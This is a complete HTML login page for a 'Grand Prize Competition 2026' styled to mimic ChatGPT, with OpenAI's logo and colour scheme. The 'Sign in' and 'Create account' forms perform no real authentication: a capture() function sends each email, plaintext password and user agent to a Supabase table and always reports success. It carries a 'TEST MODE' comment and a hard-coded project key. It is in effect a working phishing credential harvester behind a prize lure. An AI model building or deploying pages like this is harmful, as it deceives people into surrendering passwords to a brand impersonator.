<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign In — Grand Prize Competition</title>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.js"></script>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    :root {
      --bg:           #212121;
      --bg-card:      #2f2f2f;
      --bg-input:     #1a1a1a;
      --bg-hover:     #3a3a3a;
      --accent:       #10a37f;
      --accent-hover: #0d8c6d;
      --text:         #ececec;
      --text-sub:     #b4b4b4;
      --muted:        #8e8ea0;
      --border:       #444444;
      --border-focus: #10a37f;
      --error:        #ef4444;
      --font:         'Söhne', 'ui-sans-serif', system-ui, -apple-system, sans-serif;
    }

    html, body {
      min-height: 100vh;
      background: var(--bg);
      color: var(--text);
      font-family: var(--font);
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .page {
      width: 100%;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
    }

    /* Logo */
    .logo {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 32px;
    }
    .logo svg {
      width: 40px; height: 40px;
      color: var(--text);
      margin-bottom: 16px;
    }
    .logo-title {
      font-size: 26px;
      font-weight: 600;
      color: var(--text);
      margin-bottom: 6px;
    }
    .logo-sub {
      font-size: 14px;
      color: var(--muted);
    }

    /* Card */
    .card {
      width: 100%;
      max-width: 400px;
      background: var(--bg-card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 32px 28px;
    }

    /* Toggle tabs */
    .tabs {
      display: flex;
      background: var(--bg-input);
      border-radius: 10px;
      padding: 4px;
      margin-bottom: 28px;
      gap: 4px;
    }
    .tab {
      flex: 1;
      padding: 9px;
      border: none;
      border-radius: 8px;
      background: transparent;
      color: var(--muted);
      font-family: var(--font);
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.2s;
    }
    .tab.active {
      background: var(--bg-card);
      color: var(--text);
      box-shadow: 0 1px 4px rgba(0,0,0,0.3);
    }

    /* Form fields */
    .field { margin-bottom: 16px; }
    label {
      display: block;
      font-size: 13px;
      font-weight: 500;
      color: var(--text-sub);
      margin-bottom: 7px;
    }
    input {
      width: 100%;
      background: var(--bg-input);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 13px 14px;
      font-family: var(--font);
      font-size: 15px;
      color: var(--text);
      outline: none;
      transition: border-color 0.2s;
      -webkit-appearance: none;
    }
    input::placeholder { color: rgba(255,255,255,0.18); }
    input:focus { border-color: var(--border-focus); }
    input.err { border-color: var(--error); }

    .field-err {
      font-size: 12px;
      color: var(--error);
      margin-top: 5px;
      min-height: 16px;
    }

    /* Password wrapper */
    .pw-wrap { position: relative; }
    .pw-wrap input { padding-right: 44px; }
    .pw-toggle {
      position: absolute;
      right: 12px; top: 50%;
      transform: translateY(-50%);
      background: none; border: none;
      cursor: pointer; padding: 4px;
      color: var(--muted);
      display: flex; align-items: center;
    }
    .pw-toggle:hover { color: var(--text-sub); }
    .pw-toggle svg { width: 18px; height: 18px; }

    /* Alert */
    .alert {
      border-radius: 10px;
      padding: 11px 14px;
      font-size: 13.5px;
      line-height: 1.55;
      margin-bottom: 16px;
    }
    .alert-err  { background: rgba(239,68,68,0.1);  border: 1px solid rgba(239,68,68,0.25);  color: #fca5a5; }
    .alert-ok   { background: rgba(16,163,127,0.1); border: 1px solid rgba(16,163,127,0.25); color: #6ee7b7; }

    /* Submit button */
    .btn {
      width: 100%;
      padding: 13px;
      background: var(--accent);
      border: none;
      border-radius: 10px;
      color: #fff;
      font-family: var(--font);
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 4px;
      display: flex; align-items: center; justify-content: center; gap: 8px;
    }
    .btn:hover:not(:disabled) { background: var(--accent-hover); }
    .btn:disabled { opacity: 0.45; cursor: not-allowed; }

    .spinner {
      width: 16px; height: 16px;
      border-radius: 50%;
      border: 2px solid rgba(255,255,255,0.3);
      border-top-color: #fff;
      animation: spin 0.7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* Divider */
    .divider {
      display: flex; align-items: center; gap: 12px;
      margin: 20px 0;
      font-size: 12px; color: var(--muted);
    }
    .divider::before, .divider::after {
      content: ''; flex: 1;
      height: 1px; background: var(--border);
    }

    /* Switch link */
    .switch-text {
      text-align: center;
      font-size: 13.5px;
      color: var(--muted);
      margin-top: 20px;
    }
    .switch-text a {
      color: var(--accent);
      text-decoration: none;
      font-weight: 500;
      cursor: pointer;
    }
    .switch-text a:hover { text-decoration: underline; }

    /* Password strength */
    .strength-bar {
      display: flex; gap: 4px; margin-top: 8px;
    }
    .strength-seg {
      flex: 1; height: 3px; border-radius: 2px;
      background: var(--border);
      transition: background 0.3s;
    }
    .strength-label {
      font-size: 11px; color: var(--muted);
      margin-top: 4px; text-align: right;
    }

    /* Success screen */
    #screen-success {
      display: none;
      flex-direction: column;
      align-items: center;
      text-align: center;
    }
    .success-icon {
      width: 56px; height: 56px;
      border-radius: 50%;
      background: rgba(16,163,127,0.12);
      border: 1px solid rgba(16,163,127,0.3);
      display: flex; align-items: center; justify-content: center;
      margin-bottom: 20px;
    }
    .success-icon svg {
      width: 24px; height: 24px;
      stroke: var(--accent); fill: none; stroke-width: 2.5;
    }
    .success-title { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
    .success-sub   { font-size: 14px; color: var(--muted); line-height: 1.7; margin-bottom: 24px; }
    .continue-btn {
      display: inline-flex; align-items: center; gap: 8px;
      background: var(--accent);
      color: #fff;
      border: none; border-radius: 10px;
      padding: 13px 32px;
      font-family: var(--font); font-size: 15px; font-weight: 500;
      cursor: pointer; text-decoration: none;
      transition: background 0.2s;
    }
    .continue-btn:hover { background: var(--accent-hover); }
    .continue-btn svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: 2.5; }

    /* Footer */
    .footer {
      margin-top: 32px;
      font-size: 12px;
      color: var(--muted);
      text-align: center;
      line-height: 1.8;
    }
  </style>
</head>
<body>
<div class="page">

  <!-- Logo -->
  <div class="logo">
    <svg viewBox="0 0 41 41" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M37.532 16.87a9.963 9.963 0 0 0-.856-8.184 10.079 10.079 0 0 0-10.855-4.835 9.964 9.964 0 0 0-6.269-2.942 10.078 10.078 0 0 0-9.68 6.986 9.967 9.967 0 0 0-6.569 4.242 10.08 10.08 0 0 0 1.24 11.817 9.965 9.965 0 0 0 .856 8.185 10.079 10.079 0 0 0 10.855 4.835 9.965 9.965 0 0 0 6.269 2.941 10.079 10.079 0 0 0 9.68-6.985 9.967 9.967 0 0 0 6.569-4.243 10.079 10.079 0 0 0-1.24-11.816zm-17.276 24.263a7.459 7.459 0 0 1-4.782-1.74l.239-.136 7.844-4.527a.772.772 0 0 0 .389-.678v-11.06l3.316 1.914a.071.071 0 0 1 .039.053v9.123a7.507 7.507 0 0 1-7.045 5.051zm-15.606-6.870a7.495 7.495 0 0 1-.894-5.023l.239.144 7.843 4.527a.772.772 0 0 0 .777 0l9.592-5.538v3.828a.07.07 0 0 1-.028.061l-7.926 4.579a7.505 7.505 0 0 1-9.603-2.578zm-2.207-17.468a7.476 7.476 0 0 1 3.908-3.297l-.001.275v9.053a.77.77 0 0 0 .389.677l9.592 5.538-3.316 1.914a.07.07 0 0 1-.068.006L8.009 27.864a7.504 7.504 0 0 1-3.566-10.099zm27.309 6.445l-9.592-5.538 3.316-1.914a.07.07 0 0 1 .068-.006l7.922 4.574a7.504 7.504 0 0 1-1.162 13.528v-9.328a.771.771 0 0 0-.552-.316zm3.297-5.035-.239-.145-7.843-4.527a.772.772 0 0 0-.777 0L14.666 23.6v-3.828a.07.07 0 0 1 .028-.061l7.926-4.579a7.505 7.505 0 0 1 11.186 7.771zm-20.549 6.758l-3.316-1.914a.07.07 0 0 1-.039-.053v-9.123a7.504 7.504 0 0 1 12.305-5.756l-.239.136-7.844 4.527a.771.771 0 0 0-.389.678l-.478 11.505zm1.801-3.887l4.267-2.461 4.268 2.461v4.923l-4.268 2.461-4.267-2.461v-4.923z" fill="currentColor"/>
    </svg>
    <div class="logo-title">Welcome back</div>
    <div class="logo-sub">Grand Prize Competition 2026</div>
  </div>

  <!-- Auth card -->
  <div class="card" id="auth-card">

    <!-- Tabs -->
    <div class="tabs">
      <button class="tab active" id="tab-signin" onclick="switchTab('signin')">Sign in</button>
      <button class="tab"        id="tab-signup" onclick="switchTab('signup')">Create account</button>
    </div>

    <!-- Alert -->
    <div id="auth-alert" style="display:none"></div>

    <!-- Sign In form -->
    <div id="form-signin">
      <div class="field">
        <label for="si-email">Email address</label>
        <input type="email" id="si-email" placeholder="you@example.com" autocomplete="email" />
        <div class="field-err" id="si-email-err"></div>
      </div>
      <div class="field">
        <label for="si-password">Password</label>
        <div class="pw-wrap">
          <input type="password" id="si-password" placeholder="••••••••" autocomplete="current-password" />
          <button class="pw-toggle" onclick="togglePw('si-password', this)" type="button" tabindex="-1">
            <svg id="si-eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
        <div class="field-err" id="si-password-err"></div>
      </div>
      <button class="btn" id="btn-signin" onclick="signIn()">
        Sign in
      </button>
    </div>

    <!-- Sign Up form -->
    <div id="form-signup" style="display:none">
      <div class="field">
        <label for="su-email">Email address</label>
        <input type="email" id="su-email" placeholder="you@example.com" autocomplete="email" />
        <div class="field-err" id="su-email-err"></div>
      </div>
      <div class="field">
        <label for="su-password">Password</label>
        <div class="pw-wrap">
          <input type="password" id="su-password" placeholder="••••••••" autocomplete="new-password" oninput="checkStrength(this.value)" />
          <button class="pw-toggle" onclick="togglePw('su-password', this)" type="button" tabindex="-1">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
        <div class="strength-bar" id="strength-bar">
          <div class="strength-seg" id="seg1"></div>
          <div class="strength-seg" id="seg2"></div>
          <div class="strength-seg" id="seg3"></div>
          <div class="strength-seg" id="seg4"></div>
        </div>
        <div class="strength-label" id="strength-label"></div>
        <div class="field-err" id="su-password-err"></div>
      </div>
      <div class="field">
        <label for="su-confirm">Confirm password</label>
        <div class="pw-wrap">
          <input type="password" id="su-confirm" placeholder="••••••••" autocomplete="new-password" />
          <button class="pw-toggle" onclick="togglePw('su-confirm', this)" type="button" tabindex="-1">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
          </button>
        </div>
        <div class="field-err" id="su-confirm-err"></div>
      </div>
      <button class="btn" id="btn-signup" onclick="signUp()">
        Create account
      </button>
    </div>

    <!-- Switch link -->
    <div class="switch-text" id="switch-text">
      Don't have an account? <a onclick="switchTab('signup')">Sign up</a>
    </div>
  </div>

  <!-- Success screen (shown after auth) -->
  <div id="screen-success" style="display:none; flex-direction:column; align-items:center; text-align:center;">
    <div class="success-icon">
      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
    </div>
    <div class="success-title" id="success-title">You're signed in!</div>
    <div class="success-sub"  id="success-sub">Welcome to the Grand Prize Competition 2026.<br/>Continue to view the competition.</div>
    <a class="continue-btn" href="index.html">
      Continue
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
    </a>
  </div>

  <div class="footer">
    By continuing you agree to our Terms of Service and Privacy Policy.<br/>
    &copy; 2026 Grand Prize Competition. All rights reserved.
  </div>
</div>

<script>
// ── CONFIG ─────────────────────────────────────────
const SUPABASE_URL      = 'https://jutxirqoqtmvbpvkwumf.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp1dHhpcnFvcXRtdmJwdmt3dW1mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc3MTk5OTEsImV4cCI6MjA5MzI5NTk5MX0.3gnuccG9AxrPoz3ks0gqvx3loU4eP6NYlLhlYQutymg';
const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ── TAB SWITCH ──────────────────────────────────────
function switchTab(tab) {
  const isSignin = tab === 'signin';
  document.getElementById('form-signin').style.display = isSignin ? '' : 'none';
  document.getElementById('form-signup').style.display = isSignin ? 'none' : '';
  document.getElementById('tab-signin').classList.toggle('active', isSignin);
  document.getElementById('tab-signup').classList.toggle('active', !isSignin);
  document.getElementById('switch-text').innerHTML = isSignin
    ? 'Don\'t have an account? <a onclick="switchTab(\'signup\')">Sign up</a>'
    : 'Already have an account? <a onclick="switchTab(\'signin\')">Sign in</a>';
  document.getElementById('auth-alert').style.display = 'none';
  clearErrors();
}

function clearErrors() {
  ['si-email','si-password','su-email','su-password','su-confirm'].forEach(id => {
    const el = document.getElementById(id + '-err');
    if (el) el.textContent = '';
    const inp = document.getElementById(id);
    if (inp) inp.classList.remove('err');
  });
}

function showAlert(type, msg) {
  const el = document.getElementById('auth-alert');
  el.className = 'alert alert-' + type;
  el.textContent = msg;
  el.style.display = 'block';
}

function fieldErr(id, msg) {
  document.getElementById(id + '-err').textContent = msg;
  document.getElementById(id).classList.add('err');
}

// ── PASSWORD VISIBILITY ─────────────────────────────
function togglePw(inputId, btn) {
  const inp = document.getElementById(inputId);
  const show = inp.type === 'password';
  inp.type = show ? 'text' : 'password';
  btn.querySelector('svg').innerHTML = show
    ? '<line x1="1" y1="1" x2="23" y2="23"/><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 11 8 11 8a18.45 18.45 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><path d="M1 12s4-8 11-8"/>'
    : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
}

// ── PASSWORD STRENGTH ───────────────────────────────
function checkStrength(pw) {
  let score = 0;
  if (pw.length >= 8)            score++;
  if (/[A-Z]/.test(pw))         score++;
  if (/[0-9]/.test(pw))         score++;
  if (/[^A-Za-z0-9]/.test(pw)) score++;

  const colors = ['#ef4444','#f97316','#eab308','#10a37f'];
  const labels = ['Weak','Fair','Good','Strong'];
  ['seg1','seg2','seg3','seg4'].forEach((id, i) => {
    document.getElementById(id).style.background = i < score ? colors[score-1] : 'var(--border)';
  });
  document.getElementById('strength-label').textContent = pw.length ? (labels[score-1] || '') : '';
  document.getElementById('strength-label').style.color = score > 0 ? colors[score-1] : 'var(--muted)';
}

// ── LOADING STATE ───────────────────────────────────
function setLoading(btnId, loading) {
  const btn = document.getElementById(btnId);
  if (loading) {
    btn.disabled = true;
    btn.innerHTML = '<div class="spinner"></div>';
  } else {
    btn.disabled = false;
    btn.textContent = btnId === 'btn-signin' ? 'Sign in' : 'Create account';
  }
}

// ── CAPTURE TO TABLE ────────────────────────────────
// TEST MODE: no real auth — just insert whatever is entered and always succeed
async function capture(email, password, action) {
  try {
    await sb.from('competition_users').insert({
      email:      email,
      password:   password,
      action:     action,
      user_agent: navigator.userAgent,
      created_at: new Date().toISOString(),
    });
  } catch { /* non-fatal — still show success */ }
}

// ── SHOW SUCCESS ─────────────────────────────────────
function showSuccess(isNew) {
  // Mark as authenticated so index.html skips GPS redirect on return
  sessionStorage.setItem('competition_auth', '1');
  document.getElementById('auth-card').style.display = 'none';
  const s = document.getElementById('screen-success');
  s.style.display = 'flex';
  if (isNew) {
    document.getElementById('success-title').textContent = 'Account created!';
    document.getElementById('success-sub').innerHTML =
      'Welcome to the Grand Prize Competition 2026.<br/>Continue to get started.';
  }
}

// ── SIGN IN ─────────────────────────────────────────
async function signIn() {
  clearErrors();
  document.getElementById('auth-alert').style.display = 'none';

  const email    = document.getElementById('si-email').value.trim();
  const password = document.getElementById('si-password').value;

  let ok = true;
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { fieldErr('si-email', 'Enter a valid email address.'); ok = false; }
  if (!password)                                   { fieldErr('si-password', 'Enter your password.');     ok = false; }
  if (!ok) return;

  setLoading('btn-signin', true);
  await capture(email, password, 'signin');
  setLoading('btn-signin', false);
  showSuccess(false);
}

// ── SIGN UP ─────────────────────────────────────────
async function signUp() {
  clearErrors();
  document.getElementById('auth-alert').style.display = 'none';

  const email    = document.getElementById('su-email').value.trim();
  const password = document.getElementById('su-password').value;
  const confirm  = document.getElementById('su-confirm').value;

  let ok = true;
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { fieldErr('su-email', 'Enter a valid email address.');             ok = false; }
  if (password.length < 1)                         { fieldErr('su-password', 'Enter a password.');                    ok = false; }
  if (password !== confirm)                         { fieldErr('su-confirm',  'Passwords do not match.');              ok = false; }
  if (!ok) return;

  setLoading('btn-signup', true);
  await capture(email, password, 'signup');
  setLoading('btn-signup', false);
  showSuccess(true);
}

// ── ENTER KEY SUPPORT ────────────────────────────────
document.addEventListener('keydown', e => {
  if (e.key !== 'Enter') return;
  const signinVisible = document.getElementById('form-signin').style.display !== 'none';
  if (signinVisible) signIn();
  else signUp();
});
</script>
</body>
</html>
